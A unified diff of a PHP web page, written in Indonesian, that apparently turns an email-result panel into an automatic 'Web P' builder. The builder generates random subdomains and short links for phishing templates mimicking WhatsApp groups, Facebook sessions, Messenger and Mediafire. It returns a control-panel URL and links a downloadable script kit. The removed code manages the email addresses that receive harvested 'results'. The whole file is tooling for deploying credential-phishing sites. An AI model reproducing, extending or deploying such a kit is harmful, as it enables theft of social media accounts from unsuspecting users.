@@ -1,266 +1,412 @@
-<?php
-include 'data.php';
+<?php 
+include 'AlexShortLink.php';
+session_start();
+$_SESSION['session'] = bin2hex(random_bytes(32));
+
+function generateRandomSubdomain($length = 8) {
+    $characters = 'abcdefghijklmnopqrstuvwxyz0123456789-';
+    $randomString = '';
+    for ($i = 0; $i < $length; $i++) {
+        $randomString .= $characters[rand(0, strlen($characters) - 1)];
+    }
+    return $randomString;
+}
+
+$subdomain = generateRandomSubdomain();
+$domain = $_SERVER['SERVER_NAME'];
+$longURL = $domain . '/' . $subdomain;
+$zoneId = '6add90ad7cfdabb1cb1296bdb1e28118';
+$shortenedURL = shortenURL($longURL);
 ?>
 <!DOCTYPE html>
-<html lang="en" >
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Arga Ultimate</title>
-  <link rel='stylesheet' href='https://cdn.rawgit.com/JacobLett/bootstrap4-latest/504729ba/bootstrap-4-latest.min.css'><link rel="stylesheet" href="./style.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  <link href="https://fonts.cdnfonts.com/css/common-pixel" rel="stylesheet">
+  <title>Buat Web P - Otomatisイチジク</title>
   <style>
-      @import url('https://fonts.googleapis.com/css2?family=Poppins&display=swap');
-        *{
-        margin:0;
-        padding: 0;
-        box-sizing: border-box;
-        font-family: 'Poppins', sans-serif;
-        }
+    @font-face {
+      font-family: 'ibm';
+      src: url('https://saweria.co/ibm-plex-mono-latin-400.woff');
+    }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'ibm';
+    }
+    body {
+      width: 100%;
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      padding: 10px;
+      background: #E2E8F0;
+    }
+.glow {
+font-family: 'Common Pixel', sans-serif;
+  color: #fff;
+  font-size: 25px;
+  text-shadow: 0px 0px 10px #000;
+}
 
-        html,body{
-        height: 100%;
+span {
+  display: inline-block;
+  padding: 0 10px;
+}
+    .gateway {
+      position: relative;
+      max-width: 600px;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      padding: 10px;
+    }
+    .gateway span {
+      margin-bottom: 20px;
+    }
+    .gateway .form {
+      position: relative;
+      width: 100%;
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 10px;
+      padding: 0 20px;
+    }
+    .gateway .response {
+      position: relative;
+      width: 100%;
+      display: none;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      padding: 0 20px;
+      margin-top: 30px;
+      gap: 10px;
+    }
+    .response textarea {
+      width: 100%;
+      padding-left: 5px;
+      background: #A0AEC0;
+      box-shadow: 0.4rem 0.4rem 0 #222;
+      border: 1px solid #000;
+    }
+    .form label {
+      position: relative;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+    }
+    label select, label input {
+      width: 100%;
+      border: 1px solid #000;
+      border-radius: 5px;
+      height: 30px;
+      padding-left: 5px;
+      background: #A0AEC0;
+      box-shadow: 0.4rem 0.4rem 0 #222;
+    }
+    *:focus {
+      outline: none;
+    }
+    h1 {
+            font-family: 'Minecraft', sans-serif;
+            color: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
+            line-height: 25px;
         }
-
-        body{
-        display: grid;
-        place-items: center;
-        text-align: center;
-        background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
-        background-size: 400% 400%;
-        animation: gradient 20s ease infinite;
+        h1 strong {
+            font-size: 2em;
         }
-        @keyframes gradient {
-            0% {
-                background-position: 0% 50%;
-            }
-            50% {
-                background-position: 100% 50%;
-            }
-            100% {
-                background-position: 0% 50%;
-            }
-        }
-</style>
-
+    .form button {
+      padding: 5px 10px;
+      margin-top: 10px;
+      background: #faae2b;
+      box-shadow: 0.4rem 0.4rem 0 #222;
+      border: 1px solid #000;
+      border-radius: 3px;
+    }
+    .gateway .source {
+      position: fixed;
+      top: 5px;
+      right: 10px;
+      padding: 5px 10px;
+      margin-top: 10px;
+      background: #25D366;
+      box-shadow: 0.4rem 0.4rem 0 #222;
+      border: 1px solid #000;
+      border-radius: 3px;
+    }
+    footer {
+      width: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .scode {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      background: #fff;
+      height: 100%;
+      z-index: 9999;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      padding: 10px;
+    }
+    .scode textarea {
+      margin-top: 20px;
+      width: 100%;
+      height: 100%;
+      padding-left: 5px;
+      border-radius: 5px;
+      background: #A0AEC0;
+      box-shadow: 0.4rem 0.4rem 0 #222;
+      border: 1px solid #000;
+    }
+    .scode i {
+      position: fixed;
+      top: 5px;
+      right: 10px;
+      padding: 5px 10px;
+      margin-top: 10px;
+      background: pink;
+      box-shadow: 0.4rem 0.4rem 0 #222;
+      border: 1px solid #000;
+      border-radius: 3px;
+    }
+    #copyButton {
+        position: absolute;
+        top: 10px;
+        right: 10px;
+        padding: 5px 10px;
+        background-color: #faae2b;
+        border: 1px solid #000;
+        border-radius: 3px;
+        cursor: pointer;
+    }
+    .rainbow-text .char { 
+  
+  color: hsl(
+    calc(360deg * var(--char-percent)
+    ), 
+    90%, 
+    65%
+  );
+ 
+}
+#heh {
+font-family: 'Common Pixel', sans-serif;
+font-size: 50px;
+color:#FF0000;
+text-shadow: 0px 0px 10px #f00;
+}
+  </style>
 </head>
 <body>
-<div class="container" style="height:100vh;display:flex;align-items: center;justify-content: center;">
-
-  <form class="container" id="needs-validation" onsubmit="return false">
-    <div class="add">
-      <div class="form-group">
-      <img src="https://i.ibb.co/ryqNVsm/20231119-192117-removebg-preview.png" style="transform:scale(1.2);max-width: 100%">
-      </div>
-
-      <div class="jumbotron p-2">
-      <nav class="navbar navbar-light bg-dark text-white p-0 pl-2 rounded">
-        <a class="navbar-brand text-white" href="#">
-          Data Result
-        </a>
-      </nav>
-        <label class="mt-3" for="exampleInputEmail1">Nama Result</label>
-        <input type="email" class="form-control" value="<?= $nik; ?>" readonly>
-        <label class="mt-2" for="exampleInputEmail1">Panel Murni</label>
-        <input type="email" class="form-control" value="<?= $sender; ?>" readonly>
-
-        <button class="btn btn-primary mt-3" data-toggle="modal" data-target="#gantidata">Ganti Data</button>
-      </div>
-
-
-
-
-      
-
-
-
-
-
-
-
-      
-      <div class="jumbotron p-2">
-        <nav class="navbar navbar-light bg-dark text-white p-0 pl-2 rounded">
-        <a class="navbar-brand text-white" href="#">
-          Data Email
-        </a>
-      </nav>
-      <label class="mt-3" for="exampleInputEmail1">List Email</label>
-          <?php
-          $read = file_get_contents('data.json');
-          $json = json_decode($read,true);
-
-          for($i=0;$i<=count($json) - 1;$i++)
-          {
-            echo '<input type="email" class="form-control mt-1" value="'.$json[$i]['email'].'" readonly>';
-          }
-
-          ?>
-
-      <div class="mt-3">
-        <button class="btn btn-primary" data-toggle="modal" data-target="#exampleModalCenter">Tambah Email</button>
-      <button class="btn btn-danger" data-toggle="modal" data-target="#delete">Hapus Email</button>
-    </div>
-    </div>
-    </div>
-</form>
-</div>
-
-
-
-<div class="modal fade" id="gantidata" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
-  <div class="modal-dialog modal-dialog-centered" role="document">
-    <div class="modal-content">
-      <div class="modal-header">
-        <h5 class="modal-title" id="exampleModalLongTitle">Ganti Data</h5>
-      </div>
-      <div class="modal-body">
-      <div class="form-group">
-      <label for="exampleInputEmail1">Nama Ress Boleh Di Ubah</label>
-        <input type="text" id="valNick" class="form-control" value="<?= $nik; ?>">
-        <label class="mt-2" for="exampleInputEmail1">↓DiLarang Di Ubah↓</label>
-        <input type="email" id="valSender" class="form-control" value="<?= $sender; ?>">
-      </div>
-
-      </div>
-      <div class="modal-footer d-flex justify-content-start">
-        <button type="button" id="gantis" class="btn btn-success">Ganti</button>
-        <button type="button" class="btn btn-danger" data-dismiss="modal">Cancel</button>
-      </div>
-    </div>
+<div class="gateway">
+  <div href="https://www.mediafire.com/file/hqdymq5z8a7fl39/SCRIPT_WEBP_FREE_2024.zip/file" class="source">Download Script</div>
+  <div id="loading">    CREATE WEB P    </div>
+  <br>
+  <div class="form">
+    <label> TAMPILAN
+      <select class="aq" id="tampilan">
+        <option selected disabled>Pilih terlebih dahulu...</option>
+          <option value="tamp1">Grup Wa</option>
+          <option value="tamp2">Mediafire MP4</option>
+          <option value="tamp3">Mediafire Rege</option>
+          <option value="tamp4">Sesi Facebok</option>
+          <option value="tamp5">Facebook 18</option>
+          <option value="tamp6">Messenger Grup</option>
+          <option value="tamp7">Simontok New</option>
+      </select>
+    </label>
+    <label> SUBDOMAIN
+      <input name="subdomain" id="subdomain" type="text" class="playerid form-input" value="<?= $longURL ?>" readonly>
+    </label>
+    <button name="submit" id="btn">submit</button>
+  </div>
+  <div class="response">
+    <span>Response</span>
+    <textarea id="responseTextArea" rows='8' readonly></textarea>
+    <button id="copyButton"><i class="fa fa-copy"></i> Salin</button>  
   </div>
 </div>
+<footer>
+  Created By <a href="https://yandex.com" style="text-decoration: none;margin: 0 10px"> DirzzNesia </a> With <img width="20" height="20" src="https://cdn.icon-icons.com/icons2/2699/PNG/512/expressjs_logo_icon_169185.png" style="margin-left: 10px">
+</footer>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script>
+$(document).ready(function() {
+    $("#btn").click(function() {
+        var domainValue = $("#subdomain").val();
+        var selectedValue = $("#tampilan").val();
 
+        var button = $("#btn");
+        button.html('Mengirim <i class="fa fa-spinner fa-spin"></i>');
+        button.prop('disabled', true);
 
+        var responseText = "(JANGAN SAMPAI HILANG)\n\n";
+        responseText += "Domain:\n<?= $shortenedURL ?>\n";
+        responseText += "Panel Setting:\nhttps://<?= $longURL ?>/AlexHostX.php\n";
+        responseText += "Tanggal Pembuatan:\n" + new Date().toLocaleDateString();
 
+        $("#responseTextArea").val(responseText);
+        $("#copyButton").css("display", "block");
 
+        setTimeout(function() {
+            $(".response").css("display", "block");
+            button.html('submit');
+            button.prop('disabled', false);
+        }, 2000);
 
-
-<div class="modal fade" id="exampleModalCenter" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
-  <div class="modal-dialog modal-dialog-centered" role="document">
-    <div class="modal-content">
-      <div class="modal-header">
-        <h5 class="modal-title" id="exampleModalLongTitle">Tambah Email</h5>
-      </div>
-      <div class="modal-body">
-        <div id="sukses" style="display: none" class="alert alert-success alert-dismissible fade show" role="alert">
-        Email kamu <span id="emmail"></span> berhasil ditambahkan
-        <button type="button" class="close" data-dismiss="alert" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="form-group">
-      <label for="exampleInputEmail1">Pasang Sesuai Harga Sewa</label>
-      <input type="email" class="form-control" id="addEmail" aria-describedby="emailHelp" placeholder="Masukkan email baru">
-      </div>
-
-      </div>
-      <div class="modal-footer d-flex justify-content-start">
-        <button type="button" id="add" class="btn btn-success">Tambah</button>
-        <button type="button" class="btn btn-danger" data-dismiss="modal">Cancel</button>
-      </div>
-    </div>
-  </div>
-</div>
-
-
-
-<div class="modal fade" id="delete" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
-  <div class="modal-dialog modal-dialog-centered" role="document">
-    <div class="modal-content">
-      <div class="modal-header">
-        <h5 class="modal-title" id="exampleModalLongTitle">Hapus Email</h5>
-      </div>
-      <div class="modal-body">
-        <div id="suksess" style="display: none" class="alert alert-success alert-dismissible fade show" role="alert">
-        Berhasil menghapus email
-        <button type="button" class="close" data-dismiss="alert" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="form-group">
-
-        <select style="width:100%;" class="custom-select" name="zz">
-          <option selected disabled>Pilih email yang ingin kamu hapus</option>
-          <?php
-          $read = file_get_contents('data.json');
-          $json = json_decode($read,true);
-
-          for($i=0;$i<=count($json) - 1;$i++)
-          {
-            echo '<option value="'.$i.'">'.$json[$i]['email'].'</'.'option>';
-          }
-
-          ?>
-        </select>
-
-
-      </div>
-
-      </div>
-      <div class="modal-footer d-flex justify-content-start">
-        <button type="button" id="dels" class="btn btn-primary">Hapus</button>
-        <button type="button" class="btn btn-danger" data-dismiss="modal">Cancel</button>
-      </div>
-    </div>
-  </div>
-</div>
-
-
-
-
-
-
-
-
-
-  
-</div>
-<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-<script src='https://cdn.rawgit.com/JacobLett/bootstrap4-latest/504729ba/bootstrap-4-latest.min.js'></script><script  src="./script.js"></script>
-
-
-<script type="text/javascript">
-  $('#add').click(function(){
-    $(this).css('pointerEvents','none').css('opacity','0.5').css('cursor','no-drop');
-    $.get('add.php?mail='+$('#addEmail').val(),function(done){
-      if(done == 200)
-      {
-        setTimeout(() => {
-          $('#add').css('pointerEvents','unset').css('opacity','1').css('cursor','pointer');
-          location.reload()
-        },2000)
-      }
-    })
-  })
-
-  $('#dels').click(function(){
-  $(this).css('pointerEvents','none').css('opacity','0.5').css('cursor','no-drop');
-  $.get('delete.php?keys='+$('select[name=zz] option').filter(':selected').val(),function(done){
-    if(done == 200)
-    {
-      setTimeout(() => {
-        $('#dels').css('pointerEvents','unset').css('opacity','1').css('cursor','pointer');
-        location.reload()
-      },2000)
+        if(selectedValue === "tamp1") {
+      var url = "tambahweb.php";
+      var params = "nomor=" + encodeURIComponent('1') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
+      sendRequest(url, params);
+    } else if(selectedValue === "tamp2") {
+      var url = "tambahweb.php";
+      var params = "nomor=" + encodeURIComponent('2') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
+      sendRequest(url, params);
+    } else if(selectedValue === "tamp3") {
+      var url = "tambahweb.php";
+      var params = "nomor=" + encodeURIComponent('3') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
+      sendRequest(url, params);
+    } else if(selectedValue === "tamp4") {
+      var url = "tambahweb.php";
+      var params = "nomor=" + encodeURIComponent('4') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
+      sendRequest(url, params);
+    } else if(selectedValue === "tamp5") {
+      var url = "tambahweb.php";
+      var params = "nomor=" + encodeURIComponent('5') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
+      sendRequest(url, params);
+    } else if(selectedValue === "tamp6") {
+      var url = "tambahweb.php";
+      var params = "nomor=" + encodeURIComponent('6') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
+      sendRequest(url, params);
+    } else if(selectedValue === "tamp7") {
+      var url = "tambahweb.php";
+      var params = "nomor=" + encodeURIComponent('7') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
+      sendRequest(url, params);
+    } else if(selectedValue === "tamp8") {
+      var url = "tambahweb.php";
+      var params = "nomor=" + encodeURIComponent('8') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
+      sendRequest(url, params);
+    } else if(selectedValue === "tamp9") {
+      var url = "tambahweb.php";
+      var params = "nomor=" + encodeURIComponent('9') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
+      sendRequest(url, params);
+    } else if(selectedValue === "tamp10") {
+      var url = "tambahweb.php";
+      var params = "nomor=" + encodeURIComponent('10') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
+      sendRequest(url, params);
+    } else if(selectedValue === "tamp11") {
+      var url = "tambahweb.php";
+      var params = "nomor=" + encodeURIComponent('11') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
+      sendRequest(url, params);    
+    } else if(selectedValue === "tamp12") {
+      var url = "tambahweb.php";
+      var params = "nomor=" + encodeURIComponent('12') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
+      sendRequest(url, params); 
+    } else if(selectedValue === "tamp13") {
+      var url = "tambahweb.php";
+      var params = "nomor=" + encodeURIComponent('13') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
+      sendRequest(url, params); 
+    } else if(selectedValue === "tamp14") {
+      var url = "tambahweb.php";
+      var params = "nomor=" + encodeURIComponent('14') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
+      sendRequest(url, params); 
+    } else if(selectedValue === "tamp15") {
+      var url = "tambahweb.php";
+      var params = "nomor=" + encodeURIComponent('15') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
+      sendRequest(url, params); 
     }
-  })
-})
+});
 
-  $('#gantis').click(function(){
-  const nick = $('#valNick').val();
-  const sender = $('#valSender').val();
-  $(this).css('pointerEvents','none').css('opacity','0.5').css('cursor','no-drop');
-  $.get('ganti.php?nick='+nick+'&sender='+sender,function(done){
-    if(done == 200)
-    {
-      setTimeout(() => {
-        $('#gantis').css('pointerEvents','unset').css('opacity','1').css('cursor','pointer');
-        location.reload()
-      },2000)
+    $("#responseTextArea").blur(function() {
+        $("#copyButton").css("display", "none");
+    });
+
+    function sendRequest(url, params) {
+        $.post(url, params, function(data, status) {
+            console.log("Respon dari server:", data);
+        });
     }
-  })
-})
+
+    $("#copyButton").click(function() {
+        var textarea = $("#responseTextArea");
+        textarea.select();
+        document.execCommand("copy");
+        alert("Teks berhasil disalin!");
+    });
+
+    let status = "hide";
+
+    function toggleSource() {
+        let element = $(".scode");
+
+        if (status == "hide") {
+            element.css("display", "flex");
+            status = "show";
+        } else {
+            element.css("display", "none");
+            status = "hide";
+        }
+    }
+});
 </script>
+  <script>
+  alphabet = new Array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0");
+letter_count = 0;
+el = $("#loading");
+word = el.html().trim();
+finished = false;
 
+el.html("");
+for (var i = 0; i < word.length; i++) {
+  el.append("<span>"+word.charAt(i)+"</span>");
+}
+
+setTimeout(write, 75);
+incrementer = setTimeout(inc, 1000);
+
+function write() {
+  for (var i = letter_count; i < word.length; i++) {
+    var c = Math.floor(Math.random() * 36);
+    $("span")[i].innerHTML = alphabet[c];
+  }
+  if (!finished) {
+    setTimeout(write, 75);
+  }
+}
+
+function inc() {
+  $("span")[letter_count].innerHTML = word[letter_count];
+  $("span:eq("+letter_count+")").addClass("glow");
+  letter_count++;
+  if (letter_count >= word.length) {
+    finished = true;
+    setTimeout(reset, 1500);
+  } else {
+    setTimeout(inc, 100);
+  }
+}
+function reset() {
+  letter_count = 0;
+  finished = false;
+  setTimeout(inc, 1000);
+  setTimeout(write, 75);
+  $("span").removeClass("glow");
+}
+  </script>
 </body>
 </html>
